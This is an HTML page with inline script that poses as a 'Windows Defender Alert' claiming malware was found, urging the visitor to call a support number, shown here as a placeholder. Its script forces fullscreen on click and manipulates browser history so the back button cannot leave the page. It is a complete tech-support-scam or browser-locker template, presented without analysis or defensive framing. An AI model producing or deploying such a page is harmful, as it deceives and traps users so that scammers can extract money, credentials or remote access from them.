<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Security Alert</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      margin: 0;
      padding: 20px;
      background: black;
      color: white;
      font-family: sans-serif;
      text-align: center;
    }
    .box {
      background: #222;
      padding: 20px;
      border: 2px solid red;
      border-radius: 10px;
    }
  </style>
  <script>
    // Force fullscreen (for supported browsers)
    document.addEventListener("click", function () {
      let el = document.documentElement;
      if (el.requestFullscreen) el.requestFullscreen();
      else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
    });

    // Push fake history to block back button
    history.pushState(null, null, location.href);
    window.onpopstate = function () {
      alert("⚠️ Security Warning: You cannot go back from this page!");
      history.pushState(null, null, location.href); // Push again to prevent exit
    };
  </script>
</head>
<body>
  <div class="box">
    <h2>⚠️ Windows Defender Alert</h2>
    <p>Malware has been detected on your device.</p>
    <p>Call support immediately at: <strong>+1-800-FAKE-NUM</strong></p>
    <p>Do not press back. Your data is at risk.</p>
  </div>
</body>
</html>
